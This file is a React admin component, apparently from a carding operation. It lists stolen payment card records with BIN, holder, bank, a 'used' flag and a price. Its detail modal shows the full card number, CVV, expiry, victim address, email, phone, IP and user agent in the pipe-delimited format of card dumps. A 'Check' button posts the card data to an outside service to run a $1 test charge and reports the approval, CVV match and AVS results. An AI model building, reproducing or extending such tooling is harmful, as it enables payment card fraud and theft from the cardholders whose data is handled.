import React, { useState } from 'react';
import { Card, Table, Space, Pagination, Modal, Tag, Row, Col, Input, Button } from 'antd';
import { CreditCardOutlined } from '@ant-design/icons';
import axios from 'axios';

const { Column } = Table;

const BottomBox = ({ dataSource, fetchData, loading }) => {
  const [isModalVisible, setIsModalVisible] = useState(false);
  const [selectedRecord, setSelectedRecord] = useState(null);
  const [note, setNote] = useState('');
  const [checkResult, setCheckResult] = useState(null);

  const showModal = (record) => {
    setSelectedRecord(record);
    setNote(record.Note || ''); // Set giá trị ghi chú ban đầu
    setCheckResult(null); // Reset kết quả kiểm tra khi mở modal mới
    setIsModalVisible(true);
  };

  const handleOk = async () => {
    // Gọi API để cập nhật ghi chú
    try {
      const apiUrl = 'https://bc9e-51-8-81-143.ngrok-free.app/information/updateNote'; // Chỉ định URL API đầy đủ
      await axios.put(apiUrl, { note, id: selectedRecord.key });

      // Gọi lại fetchData để lấy dữ liệu mới nhất sau khi cập nhật thành công
      await fetchData();

      setIsModalVisible(false);
      setSelectedRecord(null);
    } catch (error) {
      console.error('Failed to update note:', error);
    }
  };

  const handleCheck = async () => {
    // Thực hiện hành động kiểm tra khi nhấn nút "Check"
    try {
      const apiUrl = 'https://tele.shuniji.io/api/card';
      const payload = {
        cardNumber: selectedRecord.ccnum,
        expirationMonth: selectedRecord.month,
        expirationYear: selectedRecord.year,
        CVV: selectedRecord.cvv,
        billingAddress: selectedRecord.address,
        billingPostal: selectedRecord.zipcode, // assuming zipcode is present in selectedRecord
        amountCharge: 1
      };
      const response = await axios.post(apiUrl, payload);
      setCheckResult(response.data); // Cập nhật kết quả kiểm tra
    } catch (error) {
      console.error('Failed to check:', error);
      setCheckResult('Failed to check'); // Hiển thị thông báo lỗi nếu kiểm tra thất bại
    }
  };

  const handleCancel = () => {
    setIsModalVisible(false);
    setSelectedRecord(null);
    setCheckResult(null); // Reset kết quả kiểm tra khi đóng modal
  };

  return (
    <Card>
      <Table dataSource={dataSource} pagination={false} loading={loading}>
        <Column title="BIN" dataIndex="BIN" key="BIN" />
        <Column title="EXP" dataIndex="EXP" key="EXP" />
        <Column title="Holder" dataIndex="Holder" key="Holder" />
        <Column title="City" dataIndex="City" key="City" />
        <Column title="State" dataIndex="State" key="State" />
        <Column title="ZIP" dataIndex="ZIP" key="ZIP" />
        <Column title="Country" dataIndex="Country" key="Country" />
        <Column title="Bank" dataIndex="Bank" key="Bank" />
        <Column
          title="Used"
          dataIndex="Used"
          key="Used"
          render={(text) => (
            <Tag color={text === 'Yes' ? 'red' : 'green'}>
              {text}
            </Tag>
          )}
        />
        <Column title="Log Date" dataIndex="createDate" key="createDate"></Column>
        <Column title="Total Bin" dataIndex="TotalBin" key="TotalBin" />
        <Column title="Note" dataIndex="Note" key="Note" />

        <Column
          title=""
          dataIndex="Price"
          key=""
          render={(text, record) => (
            <Space size="middle">
              {text}
              <a onClick={() => showModal(record)}>View</a>
            </Space>
          )}
        />
      </Table>
      <Pagination className="mt-2" defaultCurrent={1} total={30} />

      {selectedRecord && (
        <Modal
          title="Detailed Information"
          visible={isModalVisible}
          onOk={handleOk}
          onCancel={handleCancel}
          width={1500}
        >
          {/* <Row gutter={[16, 16]}>
            <Col span={12}> */}
          <div style={{ display: 'flex', flexDirection: 'row', justifyContent: 'space-between' }}>
            <div style={{ width: "49%" }}>
              <div >
                <p><strong>CC Number:</strong> {selectedRecord.ccnum}</p>
                <p><strong>EXP:</strong> {selectedRecord.month}/{selectedRecord.year}</p>
                <p><strong>CVV:</strong> {selectedRecord.cvv}</p>
                <p><strong>Fullname:</strong> {selectedRecord.fullname}</p>
                <p><strong>Address:</strong> {selectedRecord.address}</p>
                <p><strong>City:</strong> {selectedRecord.city}</p>
                <p><strong>State:</strong> {selectedRecord.state}</p>
                <p><strong>Email:</strong> {selectedRecord.email}</p>
                <p><strong>Phone:</strong> {selectedRecord.phone}</p>
                <p><strong>IP:</strong> {selectedRecord.ip}</p>
                <p><strong>Is Used:</strong> {selectedRecord.isUsed ? 'Yes' : 'No'}</p>
                <p><strong>User Agent:</strong> {selectedRecord.userAgent}</p>
                <p><strong>Note:</strong></p>
              </div>
              <Input.TextArea
                style={{ minHeight: '10%', marginTop: '16px' }}
                value={note}
                onChange={(e) => setNote(e.target.value)}
                rows={4}
              />
              {/* </Col> */}
            </div>
            <div style={{ width: '49%' }}>
              {/* <Col span={12} style={{ }}> */}
              <div style={{ border: '1px solid #d9d9d9', padding: '16px', borderRadius: '4px' }}>
                <CreditCardOutlined/>
                <p><strong>{selectedRecord.ccnum}|{selectedRecord.month}/{selectedRecord.year}|{selectedRecord.cvv}|{selectedRecord.address}|{selectedRecord.city}|{selectedRecord.state}|{selectedRecord.email}|{selectedRecord.phone}|{selectedRecord.ip}|{selectedRecord.userAgent}</strong></p>
              </div>
              {/* </Col> */}
              {/* <Col span={24} style={{ }}> */}
              <div style={{ border: '1px solid #d9d9d9', padding: '8px 16px', borderRadius: '4px', marginTop: '16px' }}>
                <div style={{ height: 90 }}>
                  <strong>Check Result:</strong>
                  {checkResult && typeof checkResult === 'object' ? (
                    <pre>
                      <span style={{ color: checkResult.ExpressResponseMessage === 'Approved' ? 'green' : 'red' }}>
                        <strong>Charge: {checkResult.ExpressResponseMessage}</strong>
                      </span>
                      <br />
                      <span>
                        <strong>Status: {checkResult.CVVResponseCode === 'M | CVV MATCHED' || checkResult.CVVResponseCode === 'CVV MATCHED' ? 'CVV MATCH ✅' : checkResult.CVVResponseCode}</strong>
                      </span>
                      <br />
                      <span>
                        <strong>AVS: {checkResult.AVSResponseCode}</strong>
                      </span>
                    </pre>
                  ) : (
                    <p>{checkResult?.ExpressResponseMessage}</p>
                  )}
                </div>

                <div style={{ width: "100%", display: "flex", justifyContent: 'end' }}>
                  <Button onClick={handleCheck} type="primary">Check</Button>
                </div>
              </div>
              {/* </Col> */}
            </div>

          </div>

          {/* </Row> */}
        </Modal>
      )}
    </Card>
  );
};

export default BottomBox;
